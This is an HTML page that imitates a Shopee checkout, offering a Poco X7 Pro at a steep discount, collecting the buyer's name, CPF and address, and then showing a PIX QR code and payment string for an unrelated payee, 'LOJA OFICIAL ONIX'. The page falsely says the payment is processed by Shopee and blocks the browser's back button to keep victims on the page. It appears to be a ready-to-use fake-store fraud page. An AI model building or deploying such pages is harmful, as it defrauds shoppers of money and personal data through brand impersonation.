<!DOCTYPE html>
<html lang="pt-BR">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no, viewport-fit=cover">
    <title>Finalizar Compra - Shopee</title>
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0/css/all.min.css">
    <style>
        :root { --shopee-orange: #ee4d2d; --bg: #f5f5f5; --text-gray: #757575; --teal: #00bfa5; }
        * { margin: 0; padding: 0; box-sizing: border-box; font-family: 'Roboto', sans-serif; }
        body { background: var(--bg); overflow-x: hidden; }

        /* HEADER FIXO */
        .shopee-header { 
            background: white; height: 50px; display: flex; align-items: center; 
            padding: 0 15px; position: sticky; top: 0; z-index: 1000; border-bottom: 1px solid #ddd;
        }
        .shopee-header h1 { font-size: 18px; font-weight: 400; margin-left: 20px; flex: 1; }
        .back-btn { color: var(--shopee-orange); font-size: 20px; cursor: pointer; }

        /* TELAS (SISTEMA DE PAGINA ÚNICA) */
        .page { display: none; width: 100%; min-height: 100vh; }
        .active-page { display: block; }

        /* TELA 1: PRODUTO */
        .product-img { width: 100%; background: white; }
        .product-info { background: white; padding: 15px; margin-bottom: 8px; }
        .price-row { color: var(--shopee-orange); font-size: 28px; font-weight: 500; display: flex; align-items: baseline; }
        .price-row span { font-size: 16px; margin-right: 2px; }
        .title { font-size: 15px; line-height: 1.4; margin-top: 10px; }

        /* TELA 2 e 3: CHECKOUT ESTILO SHOPEE */
        .checkout-section { background: white; padding: 15px; margin-bottom: 8px; position: relative; }
        .section-title { font-size: 14px; color: #222; margin-bottom: 10px; display: flex; align-items: center; gap: 8px; }
        
        .address-box { font-size: 13px; color: #333; line-height: 1.6; }
        .shipping-option { 
            border: 1px solid var(--teal); background: #fafffe; padding: 10px; 
            margin-top: 10px; border-radius: 2px; display: flex; justify-content: space-between;
        }

        .product-summary { display: flex; gap: 10px; padding: 10px 0; border-bottom: 1px solid #eee; }
        .product-summary img { width: 80px; height: 80px; border: 1px solid #eee; }
        .summary-details { flex: 1; font-size: 13px; }

        /* BOTÕES DE BAIXO */
        .footer-bar { 
            position: fixed; bottom: 0; width: 100%; background: white; 
            height: 55px; display: flex; align-items: center; border-top: 1px solid #eee; z-index: 1000;
        }
        .total-info { flex: 1; padding-left: 15px; text-align: right; padding-right: 15px; }
        .total-info span { display: block; font-size: 12px; color: #555; }
        .total-price { color: var(--shopee-orange); font-size: 18px; font-weight: bold; }
        
        .btn-orange { 
            background: var(--shopee-orange); color: white; border: none; 
            height: 100%; width: 140px; font-size: 15px; font-weight: 500; cursor: pointer;
        }

        /* INPUTS ESTILO FORMULÁRIO */
        .shopee-input { 
            width: 100%; padding: 12px; border: 1px solid #e8e8e8; 
            background: #fdfdfd; margin-bottom: 10px; font-size: 14px; border-radius: 2px;
        }

        /* PIX QR CODE */
        .pix-container { text-align: center; padding: 20px; }
        .pix-qr { width: 200px; height: 200px; margin: 15px auto; }
        .pix-code-box { 
            background: #f5f5f5; padding: 12px; border: 1px dashed #bbb; 
            font-size: 11px; word-break: break-all; margin: 10px 0;
        }
    </style>
</head>
<body>

    <div id="page-product" class="page active-page">
        <div class="shopee-header">
            <i class="fas fa-arrow-left back-btn"></i>
            <h1>Detalhes do Produto</h1>
            <i class="fas fa-shopping-cart back-btn" style="margin-left:15px;"></i>
        </div>
        <img src="https://down-br.img.susercontent.com/file/br-11134207-81z1k-meadx6k4pddue4" class="product-img">
        <div class="product-info">
            <div class="price-row"><span>R$</span>599,00 <span style="font-size:13px; color:#999; text-decoration:line-through; margin-left:10px;">R$2.499</span></div>
            <p class="title"><span style="background:var(--shopee-orange); color:white; padding:1px 4px; border-radius:2px; font-size:10px;">Indicado</span> Poco X7 Pro 5G Snapdragon 8 Gen 2 - 512GB/12GB RAM - Global</p>
        </div>
        <div class="checkout-section">
            <div class="section-title"><i class="fas fa-truck" style="color:var(--teal)"></i> Opções de Frete</div>
            <div style="font-size:13px;">Entrega Padrão (5 dias úteis) - <strong>Grátis</strong></div>
        </div>
        <div class="footer-bar">
            <div style="width:100px; display:flex; justify-content:space-around; color:var(--shopee-orange);"><i class="far fa-comments"></i><i class="fas fa-cart-plus"></i></div>
            <div class="total-info"></div>
            <button class="btn-orange" onclick="changePage('page-shipping')" style="width:200px;">COMPRE AGORA</button>
        </div>
    </div>

    <div id="page-shipping" class="page">
        <div class="shopee-header">
            <i class="fas fa-arrow-left back-btn" onclick="changePage('page-product')"></i>
            <h1>Informações de Envio</h1>
        </div>
        <div class="checkout-section">
            <div class="section-title"><i class="fas fa-map-marker-alt" style="color:var(--shopee-orange)"></i> Endereço de Entrega</div>
            <input type="text" id="nome" class="shopee-input" placeholder="Nome Completo">
            <input type="tel" id="cpf" class="shopee-input" placeholder="CPF">
            <input type="tel" id="cep" class="shopee-input" placeholder="CEP" onblur="checkCep(this.value)">
            <input type="text" id="rua" class="shopee-input" placeholder="Rua e Número">
            <input type="text" id="bairro" class="shopee-input" placeholder="Bairro">
            <input type="text" id="cidade" class="shopee-input" placeholder="Cidade / UF">
        </div>
        <div class="footer-bar">
            <div class="total-info"><span>Total:</span><div class="total-price">R$599,00</div></div>
            <button class="btn-orange" onclick="validateShipping()">PRÓXIMO</button>
        </div>
    </div>

    <div id="page-checkout" class="page">
        <div class="shopee-header">
            <i class="fas fa-arrow-left back-btn" onclick="changePage('page-shipping')"></i>
            <h1>Finalizar Pedido</h1>
        </div>
        
        <div class="checkout-section" style="border-bottom: 2px solid transparent; border-image: repeating-linear-gradient(45deg, #ee4d2d, #ee4d2d 10px, #fff 10px, #fff 20px, #4d94ff 20px, #4d94ff 30px, #fff 30px, #fff 40px) 10;">
            <div class="section-title" id="resumo-endereco">Aguardando endereço...</div>
        </div>

        <div class="checkout-section">
            <div class="product-summary">
                <img src="https://down-br.img.susercontent.com/file/br-11134207-81z1k-meadx6k4pddue4">
                <div class="summary-details">
                    <p>Xiaomi Poco X7 Pro 5G Global</p>
                    <p style="color:#888; margin-top:5px;">Variação: Preto Estelar</p>
                    <p style="margin-top:5px; font-weight:bold;">R$599,00</p>
                </div>
            </div>
            <div class="shipping-option">
                <div>
                    <div style="font-weight:bold; color:var(--teal);">Opção de Envio (5 Dias)</div>
                    <div style="font-size:11px; color:#757575;">Transportadora Expresso Shopee</div>
                </div>
                <div style="font-weight:bold;">R$0,00</div>
            </div>
        </div>

        <div class="checkout-section">
            <div class="section-title">Método de Pagamento</div>
            <div style="display:flex; align-items:center; gap:10px; color:var(--shopee-orange); font-weight:bold;">
                <i class="fas fa-university"></i> PIX (Aprovação Instantânea)
            </div>
        </div>

        <div class="footer-bar">
            <div class="total-info"><span>Pagamento Total:</span><div class="total-price">R$599,00</div></div>
            <button class="btn-orange" onclick="changePage('page-pix')" style="width:160px;">FAZER PEDIDO</button>
        </div>
    </div>

    <div id="page-pix" class="page">
        <div class="shopee-header">
            <i class="fas fa-arrow-left back-btn" onclick="window.location.reload()"></i>
            <h1>Pagamento PIX</h1>
        </div>
        <div class="pix-container">
            <div style="background:#fafffe; border:1px solid var(--teal); padding:10px; border-radius:4px; font-size:12px; color:#222; margin-bottom:20px;">
                <i class="fas fa-shield-alt" style="color:var(--teal)"></i> Pagamento processado pela Shopee. Seu dinheiro está seguro.
            </div>
            <p style="font-weight:bold; font-size:14px;">Escaneie o QR Code ou copie o código</p>
            <img src="https://api.qrserver.com/v1/create-qr-code/?size=200x200&data=00020101021226580014br.gov.bcb.pix0136db0cbb53-17be-449c-89c8-9bffd8f6c7b55204000053039865406599.005802BR5917LOJA OFICIAL ONIX6009SAO PAULO62070503***630453AF&color=ee4d2d" class="pix-qr">
            <div class="pix-code-box" id="pix-string">00020101021226580014br.gov.bcb.pix0136db0cbb53-17be-449c-89c8-9bffd8f6c7b55204000053039865406599.005802BR5917LOJA OFICIAL ONIX6009SAO PAULO62070503***630453AF</div>
            <button class="btn-orange" style="width:100%; height:45px; border-radius:4px;" onclick="copyPix()">COPIAR CÓDIGO PIX</button>
            <p style="font-size:12px; color:#757575; margin-top:20px;">Após o pagamento, você receberá a confirmação por e-mail e SMS em até 5 minutos.</p>
        </div>
    </div>

    <script>
        // Função para trocar de página sem recarregar
        function changePage(pageId) {
            document.querySelectorAll('.page').forEach(p => p.classList.remove('active-page'));
            document.getElementById(pageId).classList.add('active-page');
            window.scrollTo(0,0);
        }

        // Validação simples de endereço
        function validateShipping() {
            const nome = document.getElementById('nome').value;
            const rua = document.getElementById('rua').value;
            if(!nome || !rua) {
                alert("Por favor, preencha todos os campos de entrega.");
                return;
            }
            // Atualiza o resumo do endereço na tela final
            document.getElementById('resumo-endereco').innerHTML = `
                <div style="font-weight:bold; color:#222;">${nome}</div>
                <div style="color:#757575; font-size:12px; margin-top:2px;">${rua}, ${document.getElementById('bairro').value}</div>
                <div style="color:#757575; font-size:12px;">${document.getElementById('cidade').value} - CEP: ${document.getElementById('cep').value}</div>
            `;
            changePage('page-checkout');
        }

        // Busca automática de CEP
        async function checkCep(val) {
            let cleanCep = val.replace(/\D/g, '');
            if(cleanCep.length === 8) {
                let res = await fetch(`https://viacep.com.br/ws/${cleanCep}/json/`);
                let data = await res.json();
                if(!data.erro) {
                    document.getElementById('rua').value = data.logradouro;
                    document.getElementById('bairro').value = data.bairro;
                    document.getElementById('cidade').value = data.localidade + " / " + data.uf;
                }
            }
        }

        function copyPix() {
            let code = document.getElementById('pix-string').innerText;
            navigator.clipboard.writeText(code);
            alert("Código copiado com sucesso!");
        }

        // Simulação de comportamento de App (Voltar do navegador)
        history.pushState(null, null, location.href);
        window.onpopstate = function () {
            history.go(1);
            alert("Use os botões do site para navegar com segurança.");
        };
    </script>
</body>
    </html>
    
